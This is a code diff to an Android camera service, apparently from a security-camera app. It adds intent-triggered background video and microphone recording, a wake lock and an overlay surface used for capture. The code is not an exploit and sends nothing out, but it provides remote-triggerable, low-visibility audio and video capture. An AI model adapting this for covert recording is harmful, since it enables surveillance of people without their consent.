@@ -24,10 +24,13 @@ import android.hardware.camera2.CaptureRequest;
 import android.hardware.camera2.TotalCaptureResult;
 import android.media.Image;
 import android.media.ImageReader;
+import android.media.MediaRecorder;
 import android.os.Build;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.PowerManager;
 import android.util.Base64;
 import android.util.Log;
 import android.util.Size;
@@ -42,11 +45,16 @@ import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
 import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.IOException;
 import java.nio.ByteBuffer;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
+import java.util.Date;
 import java.util.List;
+import java.util.Locale;
 import java.util.concurrent.ArrayBlockingQueue;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.CountDownLatch;
@@ -78,13 +86,23 @@ public class CameraService extends Service {
     private static volatile int streamWidth = 640;
     private static volatile int streamHeight = 480;
     private static volatile int streamQuality = 50;
-    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(5);
+    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(10);
 
     // Photo capture
     private static volatile byte[] lastCapturedPhoto = null;
     private static volatile String lastCaptureError = null;
     private static volatile boolean captureInProgress = false;
     private static CountDownLatch captureLatch;
+
+    // Video recording
+    private MediaRecorder mediaRecorder;
+    private static volatile boolean isRecording = false;
+    private static String currentVideoPath = null;
+    private static long recordingStartTime = 0;
+    private Surface recorderSurface;
+
+    // WakeLock for background operation
+    private PowerManager.WakeLock wakeLock;
 
     // Singleton instance
     private static CameraService instance;
@@ -100,6 +118,13 @@ public class CameraService extends Service {
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
         createNotificationChannel();
         startBackgroundThread();
+
+        // Initialize WakeLock for background operation
+        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        wakeLock = powerManager.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "RavanSecurity:CameraWakeLock");
+        Log.d(TAG, "CameraService created with WakeLock support");
     }
 
     @Override
@@ -117,12 +142,24 @@ public class CameraService extends Service {
             } else if ("CAPTURE_PHOTO".equals(action)) {
                 String camId = intent.getStringExtra("cameraId");
                 capturePhotoBackground(camId);
+            } else if ("START_RECORDING".equals(action)) {
+                String camId = intent.getStringExtra("cameraId");
+                int width = intent.getIntExtra("width", 1280);
+                int height = intent.getIntExtra("height", 720);
+                startVideoRecording(camId, width, height);
+            } else if ("STOP_RECORDING".equals(action)) {
+                stopVideoRecording();
             } else if ("STOP".equals(action)) {
                 stopStreaming();
+                stopVideoRecording();
+                releaseWakeLock();
                 stopForeground(true);
                 stopSelf();
             }
         }
+
+        // Acquire WakeLock
+        acquireWakeLock();
 
         // Start foreground service
         startForeground();
@@ -144,9 +181,12 @@ public class CameraService extends Service {
                 .build();
 
         if (Build.VERSION.SDK_INT >= 34) {
-            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
+            // Android 14+ requires camera|microphone for video with audio
+            startForeground(NOTIFICATION_ID, notification,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
+            // Android 10+
+            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
         } else {
             startForeground(NOTIFICATION_ID, notification);
         }
@@ -763,10 +803,284 @@ public class CameraService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        Log.d(TAG, "CameraService onDestroy");
         isStreaming = false;
+        stopVideoRecording();
         closeCamera();
         removeOverlay();
         stopBackgroundThread();
+        releaseWakeLock();
         instance = null;
+    }
+
+    // ============ WAKELOCK MANAGEMENT ============
+
+    private void acquireWakeLock() {
+        if (wakeLock != null && !wakeLock.isHeld()) {
+            wakeLock.acquire(60 * 60 * 1000L); // 1 hour max
+            Log.d(TAG, "WakeLock acquired");
+        }
+    }
+
+    private void releaseWakeLock() {
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+            Log.d(TAG, "WakeLock released");
+        }
+    }
+
+    // ============ VIDEO RECORDING ============
+
+    public void startVideoRecording(String cameraId, int width, int height) {
+        if (isRecording) {
+            Log.w(TAG, "Already recording, stop first");
+            return;
+        }
+
+        if (cameraId == null)
+            cameraId = "0";
+        currentCameraId = cameraId;
+
+        final String finalCameraId = cameraId;
+        final int finalWidth = width;
+        final int finalHeight = height;
+
+        backgroundHandler.post(() -> {
+            try {
+                createOverlay();
+
+                // Wait for surface
+                if (surfaceLatch != null) {
+                    surfaceLatch.await(5, TimeUnit.SECONDS);
+                }
+
+                if (!surfaceReady) {
+                    Log.e(TAG, "Surface not ready for video recording");
+                    return;
+                }
+
+                startVideoRecordingInternal(finalCameraId, finalWidth, finalHeight);
+
+            } catch (Exception e) {
+                Log.e(TAG, "Error starting video recording", e);
+            }
+        });
+    }
+
+    private void startVideoRecordingInternal(String cameraId, int width, int height) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                Log.e(TAG, "Camera permission not granted");
+                return;
+            }
+        }
+
+        try {
+            // Close any existing camera
+            closeCamera();
+
+            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
+            Size[] sizes = characteristics.get(
+                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+                    .getOutputSizes(MediaRecorder.class);
+
+            Size size = chooseBestSize(sizes, width, height);
+            int recWidth = size.getWidth();
+            int recHeight = size.getHeight();
+
+            // Create video file
+            File videoDir = new File(Environment.getExternalStoragePublicDirectory(
+                    Environment.DIRECTORY_MOVIES), "RavanSecurity");
+            if (!videoDir.exists()) {
+                videoDir.mkdirs();
+            }
+
+            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
+                    .format(new Date());
+            File videoFile = new File(videoDir, "VID_" + timestamp + ".mp4");
+            currentVideoPath = videoFile.getAbsolutePath();
+
+            // Setup MediaRecorder
+            setupMediaRecorder(recWidth, recHeight);
+
+            // Open camera
+            if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+                cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
+                    @Override
+                    public void onOpened(@NonNull CameraDevice camera) {
+                        cameraDevice = camera;
+                        createVideoRecordingSession(recWidth, recHeight);
+                    }
+
+                    @Override
+                    public void onDisconnected(@NonNull CameraDevice camera) {
+                        camera.close();
+                        cameraDevice = null;
+                        isRecording = false;
+                    }
+
+                    @Override
+                    public void onError(@NonNull CameraDevice camera, int error) {
+                        camera.close();
+                        cameraDevice = null;
+                        isRecording = false;
+                        Log.e(TAG, "Camera error during video recording: " + error);
+                    }
+                }, backgroundHandler);
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting video recording", e);
+            isRecording = false;
+        }
+    }
+
+    private void setupMediaRecorder(int width, int height) throws IOException {
+        mediaRecorder = new MediaRecorder();
+        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
+        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+        mediaRecorder.setOutputFile(currentVideoPath);
+        mediaRecorder.setVideoEncodingBitRate(4000000); // 4 Mbps
+        mediaRecorder.setVideoFrameRate(30);
+        mediaRecorder.setVideoSize(width, height);
+        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
+        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+        mediaRecorder.setAudioEncodingBitRate(128000);
+        mediaRecorder.setAudioSamplingRate(44100);
+        mediaRecorder.prepare();
+
+        recorderSurface = mediaRecorder.getSurface();
+        Log.d(TAG, "MediaRecorder prepared: " + width + "x" + height + " -> " + currentVideoPath);
+    }
+
+    private void createVideoRecordingSession(int width, int height) {
+        try {
+            List<Surface> surfaces = new ArrayList<>();
+            surfaces.add(recorderSurface);
+
+            cameraDevice.createCaptureSession(surfaces,
+                    new CameraCaptureSession.StateCallback() {
+                        @Override
+                        public void onConfigured(@NonNull CameraCaptureSession session) {
+                            captureSession = session;
+                            startRecordingCapture();
+                        }
+
+                        @Override
+                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
+                            Log.e(TAG, "Video recording session configuration failed");
+                            isRecording = false;
+                        }
+                    }, backgroundHandler);
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Error creating video recording session", e);
+            isRecording = false;
+        }
+    }
+
+    private void startRecordingCapture() {
+        try {
+            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
+            builder.addTarget(recorderSurface);
+            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
+            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
+
+            captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);
+
+            mediaRecorder.start();
+            isRecording = true;
+            recordingStartTime = System.currentTimeMillis();
+            Log.d(TAG, "Video recording started: " + currentVideoPath);
+
+            // Update notification
+            updateNotification("Recording video...");
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting recording capture", e);
+            isRecording = false;
+        }
+    }
+
+    public void stopVideoRecording() {
+        if (!isRecording) {
+            return;
+        }
+
+        isRecording = false;
+        Log.d(TAG, "Stopping video recording");
+
+        try {
+            if (captureSession != null) {
+                captureSession.stopRepeating();
+                captureSession.close();
+                captureSession = null;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping capture session", e);
+        }
+
+        try {
+            if (mediaRecorder != null) {
+                mediaRecorder.stop();
+                mediaRecorder.reset();
+                mediaRecorder.release();
+                mediaRecorder = null;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping MediaRecorder", e);
+        }
+
+        if (recorderSurface != null) {
+            recorderSurface.release();
+            recorderSurface = null;
+        }
+
+        closeCamera();
+
+        long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
+        Log.d(TAG, "Video recording stopped. Duration: " + duration + "s, Path: " + currentVideoPath);
+
+        // Update notification
+        updateNotification("Camera service is running");
+    }
+
+    private void updateNotification(String text) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Intent notificationIntent = new Intent(this, MainActivity.class);
+            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
+                    PendingIntent.FLAG_IMMUTABLE);
+
+            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+                    .setContentTitle("Camera Service")
+                    .setContentText(text)
+                    .setSmallIcon(android.R.drawable.ic_menu_camera)
+                    .setContentIntent(pendingIntent)
+                    .setOngoing(true)
+                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .build();
+
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.notify(NOTIFICATION_ID, notification);
+            }
+        }
+    }
+
+    // ============ STATIC ACCESSORS FOR VIDEO RECORDING ============
+
+    public static boolean isCurrentlyRecording() {
+        return isRecording;
+    }
+
+    public static String getCurrentVideoPath() {
+        return currentVideoPath;
+    }
+
+    public static long getRecordingDuration() {
+        if (isRecording && recordingStartTime > 0) {
+            return (System.currentTimeMillis() - recordingStartTime) / 1000;
+        }
+        return 0;
     }
 }
